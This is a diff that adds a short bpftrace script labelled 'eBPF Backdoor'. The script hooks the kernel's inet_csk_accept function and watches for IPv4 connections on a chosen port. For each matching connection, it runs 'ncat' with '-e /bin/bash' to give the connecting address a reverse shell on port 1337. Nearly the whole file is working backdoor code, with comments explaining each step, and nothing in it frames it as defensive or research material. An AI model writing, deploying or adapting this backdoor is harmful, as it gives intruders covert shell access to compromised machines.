@@ -1,0 +1,48 @@
+#include <net/sock.h>
+
+// BEGIN section: Runs once when the program starts
+BEGIN {
+    // Display startup message and allowed source port
+    printf("eBPF Backdoor. Hit Ctrl-C to end.\n");
+    printf("Allowed source port: %u\n", $1);
+}
+
+// kretprobe section: Captures return values from inet_csk_accept
+kretprobe:inet_csk_accept {
+    // Get the socket structure from the return value
+    $sk = (struct sock *)retval;
+    
+    // Get the address family (IPv4/IPv6)
+    $inet_family = $sk->__sk_common.skc_family;
+    
+    // Only process IPv4 connections
+    if ($inet_family != AF_INET) {
+        return;
+    }
+    
+    // Get the destination port from the socket
+    $dport = $sk->__sk_common.skc_dport;
+    
+    // Convert port from big-endian to little-endian
+    // This is necessary because network protocols use big-endian
+    // and we need to compare with the allowed source port
+    $src_port = (( $dport >> 8) | (($dport << 8) & 0x00FF00));
+    
+    // Check if the source port matches our allowed port
+    if ($src_port != $1) {
+        return;
+    }
+    
+    // Convert the IP address to string format
+    $daddr = ntop($sk->__sk_common.skc_daddr);
+    
+    // Add timestamp to our output
+    time("%H:%M:%S ");
+    
+    // Log the connection attempt
+    printf("Got connection from %s on allowed port\n", $daddr);
+    
+    // Launch reverse shell using ncat
+    // %s will be replaced with the IP address
+    system("ncat %s 1337 -e /bin/bash\n", $daddr);
+}
